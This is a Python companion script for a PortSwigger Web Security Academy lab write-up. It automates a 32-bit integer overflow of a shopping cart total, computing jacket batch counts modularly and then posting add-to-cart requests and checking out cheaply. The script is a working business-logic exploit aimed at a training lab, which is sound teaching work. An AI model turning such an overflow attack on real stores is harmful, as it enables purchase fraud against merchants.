#!/usr/bin/env python3
"""
Low-level logic flaw
PortSwigger Web Security Academy -- Business Logic Vulnerabilities

Companion script for the writeup: 05-low-level-logic-flaw.md

What this does:
    Logs in as wiener:peter and overflows the cart's 32-bit signed integer
    total by adding the leather jacket in batches of 99 (the per-request
    quantity cap). Rather than empirically watching the total wrap in a
    browser -- PortSwigger's own approach -- this solves it as modular
    arithmetic up front: the final total after `n` batches of 99 jackets is
    `(n * 99 * jacket_cents) mod 2**32`, so the script scans a plausible
    range of batch counts (162-340) plus an offset quantity of the cheapest
    other product, picks whichever combination lands the wrapped total
    inside (0, 10000] cents using the fewest total HTTP requests, computes
    that *before* sending anything, then fires the batches and checks out.
    This is a deliberate divergence from PortSwigger's official solution,
    which finds the batch count (323) and the final offset (47) by watching
    Burp Intruder's null-payload attack run live against the cart total.

Usage:
    python 05-low-level-logic-flaw.py <lab-url>
    e.g. python 05-low-level-logic-flaw.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx


def _get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def _login(client: httpx.Client, base: str, username: str, password: str) -> None:
    csrf = _get_csrf(client, f"{base}/login")
    client.post(f"{base}/login", data={"csrf": csrf, "username": username, "password": password})


def solve(lab_url: str) -> None:
    c = httpx.Client(follow_redirects=True, timeout=15)
    _login(c, lab_url, "wiener", "peter")

    # Read prices from the shop listing page -- the individual product page's
    # price regex occasionally matched "Store credit: $100.00" instead.
    shop_r = c.get(f"{lab_url}/")
    product_prices = {}
    for m in re.finditer(r'\$(\d+\.\d+)[^$]*?productId=(\d+)', shop_r.text):
        pid = int(m.group(2))
        if pid not in product_prices:
            product_prices[pid] = float(m.group(1))

    jacket_price = product_prices.get(1, 1337.00)
    jacket_cents = int(jacket_price * 100)

    offset_id = min((p for p in product_prices if p != 1), key=lambda p: product_prices[p])
    cheap_price = product_prices[offset_id]
    cheap_cents = int(cheap_price * 100)
    print(f"[*] Jacket: ${jacket_price} (pid=1), Offset: ${cheap_price} (pid={offset_id})")

    MOD = 2 ** 32  # signed 32-bit overflow wraps mod 2^32

    best = None
    best_reqs = float('inf')

    for nb in range(162, 340):
        jacket_total = nb * 99 * jacket_cents
        remainder = jacket_total % MOD

        if 0 < remainder <= 10000:
            if nb < best_reqs:
                best = (nb, 0, remainder)
                best_reqs = nb
            continue

        gap = (MOD - remainder) % MOD
        if gap == 0:
            continue

        base_cheap = gap // cheap_cents
        for adj in range(max(0, base_cheap - 2), base_cheap + 3):
            combined = (jacket_total + adj * cheap_cents) % MOD
            if 0 < combined <= 10000:
                total_reqs = nb + (adj + 98) // 99
                if total_reqs < best_reqs:
                    best = (nb, adj, combined)
                    best_reqs = total_reqs
                break

    if best is None:
        print("[-] Could not find overflow parameters in the scanned range.")
        return

    target_batches, target_cheap, expected_cents = best
    print(f"[*] Plan: {target_batches} batches of 99 jackets + {target_cheap} of product {offset_id}")
    print(f"[*] Expected final total: ${expected_cents/100:.2f}")
    print(f"[*] Total requests: {target_batches + (target_cheap + 98)//99}")

    csrf = _get_csrf(c, f"{lab_url}/cart")
    cart_url = f"{lab_url}/cart"

    jacket_payload = {"csrf": csrf, "productId": "1", "quantity": "99", "redir": "PRODUCT"}
    for i in range(target_batches):
        c.post(cart_url, data=jacket_payload)
        if (i + 1) % 50 == 0:
            print(f"[*] Jacket batches: {i+1}/{target_batches}")

    if target_cheap > 0:
        full = target_cheap // 99
        rem = target_cheap % 99
        for _ in range(full):
            c.post(cart_url, data={"csrf": csrf, "productId": str(offset_id), "quantity": "99", "redir": "PRODUCT"})
        if rem > 0:
            c.post(cart_url, data={"csrf": csrf, "productId": str(offset_id), "quantity": str(rem), "redir": "PRODUCT"})
        print(f"[*] Added {target_cheap} of product {offset_id}")

    cart_r = c.get(f"{lab_url}/cart")
    all_totals = re.findall(r'-?\$[\d,]+\.\d+', cart_r.text)
    current = float(all_totals[-1].replace("$", "").replace(",", "")) if all_totals else 0.0
    print(f"[*] Actual total after overflow: ${current:.2f}")

    for _ in range(20):
        if 0 < current <= 100:
            break
        c.post(cart_url, data={"csrf": csrf, "productId": str(offset_id), "quantity": "1", "redir": "PRODUCT"})
        cart_r = c.get(f"{lab_url}/cart")
        all_totals = re.findall(r'-?\$[\d,]+\.\d+', cart_r.text)
        if all_totals:
            current = float(all_totals[-1].replace("$", "").replace(",", ""))

    csrf = _get_csrf(c, f"{lab_url}/cart")
    c.post(f"{lab_url}/cart/checkout", data={"csrf": csrf})

    check = c.get(lab_url)
    if "Congratulations" in check.text:
        print(f"[+] Lab solved -- checked out at ${current:.2f} after the 32-bit overflow.")
    else:
        print(f"[-] Not solved yet -- final total was ${current:.2f}, inspect the cart.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
